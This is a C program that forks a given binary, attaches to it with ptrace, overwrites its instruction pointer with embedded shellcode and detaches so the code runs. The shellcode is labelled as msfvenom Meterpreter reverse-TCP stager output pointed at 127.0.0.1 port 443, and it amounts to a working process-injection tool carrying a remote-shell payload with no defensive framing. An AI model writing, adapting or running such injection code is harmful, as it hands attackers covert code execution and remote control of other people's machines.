#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

// msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f c
size_t len = 130;
unsigned char buf[] = 
"\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
"\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
"\x01\xbb\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
"\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
"\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
"\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
"\x78\xed\xff\xe6";


int main(int argc, char *argv[])
{
	if (argc < 2)
	{
		printf("Usage: %s binary\n", argv[0]);
		return 1;
	}
	
	char *prog_name = argv[1];
	pid_t pid = fork();

	char *const params[] = { prog_name, 0};

	// child process
	if (pid == 0)
	{
		// attaching to child
		if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
		{
			perror("Could not attach to child process");
			return 1;
		}

		execve(prog_name, params, 0);
		return 1;
	}

	// parent process
	if (waitpid(pid, 0, 0) == -1)
	{
		perror("Failed waiting for child process");
		return 1;
	}

	// Get child process registers
	struct user_regs_struct regs;

	if (ptrace(PTRACE_GETREGS, pid, 0, &regs) == -1)
	{
		perror("Failed getting child registers");
		return 1;
	}

	// Rewrite RIP with our shellcode
	unsigned long addr = regs.rip;
	
	for (int i = 0; i < len; i = i + sizeof(unsigned long))
	{
		unsigned long w = ((unsigned long*)buf)[i/sizeof(unsigned long)];
		
		if (ptrace(PTRACE_POKETEXT, pid, addr + i, w) == -1)
		{
			perror("Failed writing memory to child");
		}

		printf("Writing PID: %d Addr: 0x%08x Buf: 0x%08x\n", pid, addr + i, w);
	}

	// Detach from child
	if (ptrace(PTRACE_DETACH, pid, 0, 0) == -1)
	{
		perror("Failed detaching from child");
		return 1;
	}

	return 0;
}
